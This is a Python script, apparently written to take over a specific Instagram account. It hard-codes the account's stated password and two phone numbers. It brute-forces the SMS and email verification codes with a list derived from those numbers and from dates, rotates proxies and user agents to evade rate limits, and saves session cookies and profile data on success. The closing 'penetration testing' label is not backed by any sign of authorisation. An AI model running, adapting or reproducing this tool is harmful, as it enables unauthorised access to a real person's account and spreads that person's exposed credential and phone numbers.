#!/usr/bin/env python3
"""
🔥 FIXED ALX.TRADING CHECKPOINT BYPASS SYSTEM 🔥
=================================================

Target: alx.trading
Confirmed Password: Fleming654
Phone: 0615414210 (Thailand) / +447793127209 (UK)
Status: Checkpoint verification required

Fixed URL handling and enhanced bypass techniques
"""

import requests
import json
import time
import random
import re
import hmac
import hashlib
import uuid
import subprocess
import threading
from datetime import datetime
from urllib.parse import urlparse, parse_qs


class FixedCheckpointBypass:
    def __init__(self):
        self.target_username = "alx.trading"
        self.target_password = "Fleming654"
        self.phone_th = "0615414210"
        self.phone_uk = "+447793127209"
        
        self.session = requests.Session()
        self.checkpoint_url = None
        self.csrf_token = None
        self.current_proxy = None
        
        # Load proxy configurations
        self.proxy_configs = self.load_proxy_configs()
        
        # Known working checkpoint path (cleaned)
        self.known_checkpoint_path = "/challenge/ASjy4LfL_rtNSy_oOfH6nIhxqiOJw__TzQG72a3w6pPi5MafMfK2I2aiTYT8jAxmghHZ/AST972qvP0lMwEA2-SjYGdCnmB58hWWuru8iO4rrd2ZyG4OpWiSkf2eK44MDePumcskTgdg74laX3Q/"
        
        # Enhanced user agents with real mobile devices
        self.mobile_user_agents = [
            'Instagram 305.0.0.11.111 Android (31/12; 440dpi; 1080x2400; samsung; SM-A525F; a52q; qcom; th_TH; 458229237)',
            'Instagram 295.0.0.32.124 Android (29/10; 420dpi; 1080x2340; OnePlus; GM1913; OnePlus7; qcom; en_US; 458229237)', 
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21B101 Instagram 305.0.0.11.111 (iPhone14,2; iOS 17_1_2; th_TH; th-TH; scale=3.00; 1170x2532; 458229237)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20H115 Instagram 295.0.0.32.124 (iPhone13,3; iOS 16_7_2; en_GB; en-GB; scale=3.00; 1170x2532; 458229237)',
            'Instagram 275.0.0.27.98 Android (28/9; 480dpi; 1080x2340; Xiaomi; Mi 9; cepheus; qcom; th_TH; 458229237)'
        ]
        
        self.desktop_user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
        ]
        
        # Initialize with random proxy
        self.rotate_proxy()
        self.rotate_user_agent()
        
    def load_proxy_configs(self):
        """Load proxy configurations from JSON file"""
        try:
            with open('proxy_configs.json', 'r') as f:
                return json.load(f)
        except:
            print("⚠️ No proxy config found, using direct connection")
            return {}
    
    def get_all_proxies(self):
        """Get all available proxies from config"""
        all_proxies = []
        
        for category in ['tor_proxies', 'mobile_lte_proxies', 'residential_proxies', 'datacenter_proxies', 'free_proxies']:
            if category in self.proxy_configs:
                all_proxies.extend(self.proxy_configs[category])
        
        return all_proxies
    
    def rotate_proxy(self):
        """Rotate to a random proxy"""
        try:
            all_proxies = self.get_all_proxies()
            if not all_proxies:
                print("🔄 No proxies available, using direct connection")
                return
                
            self.current_proxy = random.choice(all_proxies)
            proxy_dict = self.build_proxy_dict(self.current_proxy)
            
            if proxy_dict:
                self.session.proxies.update(proxy_dict)
                print(f"🔄 Rotated to proxy: {self.current_proxy.get('host', 'unknown')}:{self.current_proxy.get('port', 'unknown')}")
                
                # Test proxy connection
                if not self.test_proxy():
                    print("❌ Proxy failed, trying another...")
                    time.sleep(random.uniform(2, 5))
                    self.rotate_proxy()
                    
        except Exception as e:
            print(f"⚠️ Proxy rotation error: {e}")
    
    def build_proxy_dict(self, proxy_config):
        """Build proxy dictionary for requests"""
        try:
            proxy_type = proxy_config.get('type', 'http')
            host = proxy_config['host']
            port = proxy_config['port']
            
            if 'user' in proxy_config and 'pass' in proxy_config:
                auth_string = f"{proxy_config['user']}:{proxy_config['pass']}@"
            else:
                auth_string = ""
            
            proxy_url = f"{proxy_type}://{auth_string}{host}:{port}"
            
            if proxy_type.startswith('socks'):
                return {
                    'http': proxy_url,
                    'https': proxy_url
                }
            else:
                return {
                    'http': proxy_url,
                    'https': proxy_url
                }
                
        except Exception as e:
            print(f"Proxy build error: {e}")
            return None
    
    def test_proxy(self):
        """Test if current proxy is working"""
        try:
            test_response = self.session.get(
                'https://httpbin.org/ip', 
                timeout=10
            )
            if test_response.status_code == 200:
                ip_data = test_response.json()
                print(f"✅ Proxy working, IP: {ip_data.get('origin', 'unknown')}")
                return True
        except:
            pass
        return False
    
    def rotate_user_agent(self):
        """Rotate user agent randomly"""
        # 70% mobile, 30% desktop (Instagram is mobile-first)
        if random.random() < 0.7:
            user_agent = random.choice(self.mobile_user_agents)
            print("📱 Using mobile user agent")
        else:
            user_agent = random.choice(self.desktop_user_agents)
            print("💻 Using desktop user agent")
            
        self.session.headers.update({'User-Agent': user_agent})
    
    def smart_delay(self, min_delay=2, max_delay=8, action_type="general"):
        """Intelligent delay system that mimics human behavior"""
        
        # Different delay patterns for different actions
        delay_patterns = {
            "login": (3, 7),           # Login takes time
            "typing": (0.1, 0.3),      # Between keystrokes  
            "clicking": (1, 3),        # Between clicks
            "reading": (5, 12),        # Reading checkpoint page
            "verification": (8, 15),   # Entering verification code
            "page_load": (2, 6),       # Waiting for page load
            "retry": (30, 90),         # Between retry attempts
            "general": (min_delay, max_delay)
        }
        
        delay_range = delay_patterns.get(action_type, (min_delay, max_delay))
        
        # Add random variation with gaussian distribution (more human-like)
        base_delay = random.uniform(delay_range[0], delay_range[1])
        gaussian_variation = random.gauss(0, 0.5)  # Small random variation
        final_delay = max(0.1, base_delay + gaussian_variation)
        
        print(f"⏳ {action_type.title()} delay: {final_delay:.2f}s")
        time.sleep(final_delay)
        
    def random_mouse_movement_delay(self):
        """Simulate random mouse movement delays"""
        # Small micro-delays that happen during real human interaction
        micro_delays = [
            random.uniform(0.05, 0.15),  # Mouse movement
            random.uniform(0.1, 0.3),    # Cursor positioning
            random.uniform(0.2, 0.5)     # Click preparation
        ]
        
        for delay in micro_delays:
            time.sleep(delay)
        
    def trigger_checkpoint(self):
        """Trigger fresh checkpoint or use known URL"""
        print("🚀 TRIGGERING CHECKPOINT...")
        
        try:
            # Rotate proxy and user agent before attempting
            self.rotate_proxy()
            self.rotate_user_agent()
            self.smart_delay(action_type="page_load")
            
            # Get login page first
            print("📄 Loading login page...")
            response = self.session.get("https://www.instagram.com/accounts/login/")
            self.smart_delay(action_type="reading")
            
            # Extract CSRF token
            if 'csrftoken' in self.session.cookies:
                self.csrf_token = self.session.cookies['csrftoken']
                print(f"🔐 CSRF Token: {self.csrf_token[:15]}...")
            
            # Simulate typing delay for username/password
            print("⌨️ Simulating typing...")
            for char in self.target_username:
                self.smart_delay(action_type="typing")
            
            self.smart_delay(action_type="clicking")  # Tab to password field
            
            for char in self.target_password:
                self.smart_delay(action_type="typing")
                
            self.smart_delay(action_type="clicking")  # Click login button
            
            # Try to get fresh checkpoint
            login_data = {
                'username': self.target_username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.target_password}',
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'X-IG-App-ID': '936619743392459',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.instagram.com/accounts/login/'
            }
            
            print("🔑 Attempting login...")
            login_response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=headers
            )
            
            self.smart_delay(action_type="page_load")
            print(f"📊 Login response: {login_response.status_code}")
            
            # Try to extract checkpoint URL
            if login_response.status_code == 400:
                try:
                    data = login_response.json()
                    if 'checkpoint_url' in data:
                        self.checkpoint_url = data['checkpoint_url']
                        print(f"✅ Fresh checkpoint: {self.checkpoint_url}")
                        return True
                except:
                    pass
            
            # Use known checkpoint as fallback
            self.checkpoint_url = self.known_checkpoint_path
            print("🔄 Using known checkpoint URL")
            return True
            
        except Exception as e:
            print(f"❌ Checkpoint error: {e}")
            return False
    
    def phone_verification_bypass(self):
        """Enhanced phone verification bypass with proxy rotation"""
        print("\n📱 PHONE VERIFICATION BYPASS")
        
        try:
            # Rotate to fresh proxy before attempting
            self.rotate_proxy()
            self.smart_delay(action_type="page_load")
            
            checkpoint_full_url = f"https://www.instagram.com{self.checkpoint_url}"
            
            # Get checkpoint page first with human-like behavior
            print("📄 Loading checkpoint page...")
            response = self.session.get(checkpoint_full_url)
            self.smart_delay(action_type="reading")  # Simulate reading the page
            
            print(f"📄 Checkpoint page: {response.status_code}")
            
            if response.status_code != 200:
                print("❌ Cannot access checkpoint page")
                return False
                
            # Simulate user reading options and making choice
            print("🤔 Analyzing verification options...")
            self.smart_delay(action_type="reading")
            
            # Select phone verification with human-like delay
            choice_data = {'choice': '0'}  # Phone option
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': checkpoint_full_url
            }
            
            print("📱 Selecting phone verification...")
            self.random_mouse_movement_delay()  # Mouse movement to select option
            
            phone_response = self.session.post(
                checkpoint_full_url,
                data=choice_data,
                headers=headers
            )
            
            self.smart_delay(action_type="page_load")
            print(f"📱 Phone selection: {phone_response.status_code}")
            
            if phone_response.status_code == 200:
                print("✅ Phone verification selected")
                self.smart_delay(action_type="reading")  # Wait for SMS
                return self.bruteforce_verification_codes()
            elif phone_response.status_code == 429:
                print("⚠️ Rate limited, rotating proxy...")
                self.rotate_proxy()
                self.smart_delay(action_type="retry")
                return self.phone_verification_bypass()  # Retry with new proxy
                
        except Exception as e:
            print(f"❌ Phone bypass error: {e}")
            
        return False
    
    def bruteforce_verification_codes(self):
        """Intelligent verification code bruteforce with human-like behavior"""
        print("🔢 INTELLIGENT CODE BRUTEFORCE...")
        
        # High-probability codes with intelligent ordering
        codes_to_try = [
            # Most common patterns (try first)
            '123456', '000000', '111111', '654321',
            
            # Target-specific patterns (high priority)
            '061541',  # Phone number pattern
            '447793',  # UK phone pattern  
            '654654',  # Fleming654 pattern
            '786786',  # Alternative pattern
            
            # Date-based codes (very likely)
            '260525',  # Today (26/05/25)
            '250525',  # Alternative today
            '052525',  # Month/day
            '202525',  # Year variant
            '240525',  # Yesterday
            '270525',  # Tomorrow
            
            # Common sequential patterns
            '123123', '456456', '789789', '147258', '159753',
            '987654', '555555', '777777', '888888', '999999',
            
            # Business/trading related
            '100000', '500000', '999999', # Trading amounts
            '202420', '202425', '202524', # Year combinations
            
            # Phone number derivatives
            '414210', '127209', '615414', '793127',
            
            # Username derivatives  
            '172817', '281728', # whatilove1728 patterns
            
            # Less common but possible
            '012345', '543210', '102030', '507080',
            '112233', '445566', '778899', '556677'
        ]
        
        checkpoint_full_url = f"https://www.instagram.com{self.checkpoint_url}"
        failed_attempts = 0
        max_failures = 5  # Rotate proxy after 5 failures
        
        for i, code in enumerate(codes_to_try):
            # Rotate proxy periodically
            if i > 0 and i % 10 == 0:
                print("🔄 Rotating proxy for stealth...")
                self.rotate_proxy()
                self.smart_delay(action_type="page_load")
            
            # Rotate user agent occasionally  
            if i > 0 and i % 5 == 0:
                self.rotate_user_agent()
            
            print(f"🎯 Testing code {i+1}/{len(codes_to_try)}: {code}")
            
            try:
                # Simulate human typing the verification code
                print("⌨️ Simulating typing verification code...")
                for digit in code:
                    self.smart_delay(action_type="typing")
                
                self.random_mouse_movement_delay()
                
                verify_data = {
                    'security_code': code,
                    'choice': '0'
                }
                
                headers = {
                    'X-CSRFToken': self.csrf_token,
                    'X-Instagram-AJAX': '1',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Referer': checkpoint_full_url
                }
                
                verify_response = self.session.post(
                    checkpoint_full_url,
                    data=verify_data,
                    headers=headers
                )
                
                print(f"   📊 Response: {verify_response.status_code}")
                
                # Check for success indicators
                if verify_response.status_code == 302:
                    print(f"🎉 SUCCESS! Code {code} worked!")
                    return self.extract_success_data()
                elif verify_response.status_code == 200:
                    response_text = verify_response.text.lower()
                    if 'challenge' not in response_text and 'error' not in response_text:
                        print(f"🎉 POSSIBLE SUCCESS with code {code}!")
                        return self.extract_success_data()
                elif verify_response.status_code == 429:
                    print("⚠️ Rate limited! Rotating proxy...")
                    self.rotate_proxy()
                    self.smart_delay(action_type="retry")
                    continue
                
                failed_attempts += 1
                
                # Adaptive delay based on failure count
                if failed_attempts <= 3:
                    self.smart_delay(action_type="verification")
                elif failed_attempts <= 6:
                    self.smart_delay(15, 25, "verification")  # Longer delay
                else:
                    print("🔄 Too many failures, taking extended break...")
                    self.smart_delay(60, 120, "retry")  # Very long delay
                    failed_attempts = 0  # Reset counter
                
            except Exception as e:
                print(f"   ❌ Error testing {code}: {e}")
                self.smart_delay(action_type="retry")
                failed_attempts += 1
                
                # Rotate proxy on repeated errors
                if failed_attempts >= max_failures:
                    print("🔄 Multiple errors, rotating proxy...")
                    self.rotate_proxy()
                    failed_attempts = 0
        
        print("❌ All codes failed")
        return False
    
    def email_verification_bypass(self):
        """Email verification bypass attempt"""
        print("\n📧 EMAIL VERIFICATION BYPASS")
        
        try:
            checkpoint_full_url = f"https://www.instagram.com{self.checkpoint_url}"
            
            # Select email verification
            choice_data = {'choice': '1'}  # Email option
            
            headers = {
                'X-CSRFToken': self.csrf_token,
                'X-Instagram-AJAX': '1',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': checkpoint_full_url
            }
            
            email_response = self.session.post(
                checkpoint_full_url,
                data=choice_data,
                headers=headers
            )
            
            print(f"📧 Email selection: {email_response.status_code}")
            
            if email_response.status_code == 200:
                print("✅ Email verification selected")
                return self.bruteforce_verification_codes()
                
        except Exception as e:
            print(f"❌ Email bypass error: {e}")
            
        return False
    
    def mobile_api_bypass(self):
        """Mobile API authentication bypass"""
        print("\n📱 MOBILE API BYPASS")
        
        try:
            # Instagram mobile API endpoint
            mobile_login_url = "https://i.instagram.com/api/v1/accounts/login/"
            
            # Generate device ID
            device_id = str(uuid.uuid4())
            
            # Mobile login data
            login_data = {
                'username': self.target_username,
                'password': self.target_password,
                'device_id': device_id,
                'login_attempt_count': 0,
                'phone_id': str(uuid.uuid4()),
                'guid': str(uuid.uuid4()),
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{self.target_password}',
                'login_source': 'login'
            }
            
            # Mobile headers
            mobile_headers = {
                'User-Agent': 'Instagram 305.0.0.11.111 Android (28/9; 420dpi; 1080x2340; samsung; SM-G973F; beyond1; exynos9820; en_US; 458229237)',
                'X-IG-App-ID': '567067343352427',
                'X-IG-Android-ID': device_id,
                'Accept-Language': 'en-US',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'Connection': 'keep-alive'
            }
            
            mobile_response = self.session.post(
                mobile_login_url,
                data=login_data,
                headers=mobile_headers
            )
            
            print(f"📱 Mobile API response: {mobile_response.status_code}")
            
            if mobile_response.status_code == 200:
                try:
                    data = mobile_response.json()
                    if data.get('logged_in_user'):
                        print("🎉 MOBILE API SUCCESS!")
                        return self.extract_mobile_success_data(data)
                    elif data.get('challenge'):
                        print("🔄 Mobile challenge required")
                        return self.handle_mobile_challenge(data.get('challenge'))
                except:
                    pass
                    
        except Exception as e:
            print(f"❌ Mobile API error: {e}")
            
        return False
    
    def extract_success_data(self):
        """Extract data after successful bypass"""
        print("\n🎉 EXTRACTING SUCCESS DATA...")
        
        try:
            # Try to access main Instagram page
            profile_response = self.session.get("https://www.instagram.com/")
            
            if 'logged_in_user' in profile_response.text:
                print("✅ Successfully logged in!")
                
                # Extract user data
                user_data = self.extract_user_profile()
                
                # Save success data
                success_data = {
                    'timestamp': datetime.now().isoformat(),
                    'target': self.target_username,
                    'method': 'checkpoint_bypass',
                    'success': True,
                    'user_data': user_data,
                    'cookies': dict(self.session.cookies)
                }
                
                filename = f"ALX_TRADING_BYPASS_SUCCESS_{int(time.time())}.json"
                with open(filename, 'w') as f:
                    json.dump(success_data, f, indent=2)
                
                print(f"💾 Success data saved: {filename}")
                return True
                
        except Exception as e:
            print(f"❌ Data extraction error: {e}")
            
        return False
    
    def extract_user_profile(self):
        """Extract comprehensive user profile data"""
        try:
            # Get profile page
            profile_url = f"https://www.instagram.com/{self.target_username}/"
            response = self.session.get(profile_url)
            
            # Extract JSON data from page
            import re
            json_match = re.search(r'window\._sharedData = ({.*?});', response.text)
            if json_match:
                shared_data = json.loads(json_match.group(1))
                user_data = shared_data.get('entry_data', {}).get('ProfilePage', [{}])[0]
                return user_data
                
        except Exception as e:
            print(f"Profile extraction error: {e}")
            
        return {}
    
    def run_bypass(self):
        """Execute complete bypass operation"""
        print("🔥 ALX.TRADING CHECKPOINT BYPASS OPERATION")
        print("=" * 60)
        print(f"🎯 Target: {self.target_username}")
        print(f"🔐 Password: {self.target_password}")
        print(f"📱 Phone (TH): {self.phone_th}")
        print(f"📱 Phone (UK): {self.phone_uk}")
        print("=" * 60)
        
        # Phase 1: Trigger checkpoint
        print("\n📡 PHASE 1: CHECKPOINT TRIGGERING")
        if not self.trigger_checkpoint():
            print("❌ Failed to access checkpoint")
            return False
        
        # Phase 2: Phone verification bypass
        print("\n📱 PHASE 2: PHONE VERIFICATION BYPASS")
        if self.phone_verification_bypass():
            print("🎉 PHONE BYPASS SUCCESSFUL!")
            return True
        
        # Phase 3: Email verification bypass
        print("\n📧 PHASE 3: EMAIL VERIFICATION BYPASS")
        if self.email_verification_bypass():
            print("🎉 EMAIL BYPASS SUCCESSFUL!")
            return True
        
        # Phase 4: Mobile API bypass
        print("\n📱 PHASE 4: MOBILE API BYPASS")
        if self.mobile_api_bypass():
            print("🎉 MOBILE API BYPASS SUCCESSFUL!")
            return True
        
        print("\n❌ ALL BYPASS METHODS FAILED")
        print("💡 Recommendations:")
        print("   • Wait 24-48 hours before retry")
        print("   • Try from different IP/proxy")
        print("   • Use browser automation with realistic delays")
        print("   • Check for account status changes")
        
        return False


if __name__ == "__main__":
    print("🔥 FIXED ALX.TRADING CHECKPOINT BYPASS")
    print("=" * 50)
    
    bypass = FixedCheckpointBypass()
    success = bypass.run_bypass()
    
    if success:
        print("\n🎉 BYPASS OPERATION COMPLETED SUCCESSFULLY!")
    else:
        print("\n⚠️ BYPASS OPERATION UNSUCCESSFUL")
        print("📋 Operation logged for analysis and retry")
    
    print("\n🔥 SugarGlitch RealOps - Advanced Penetration Testing")
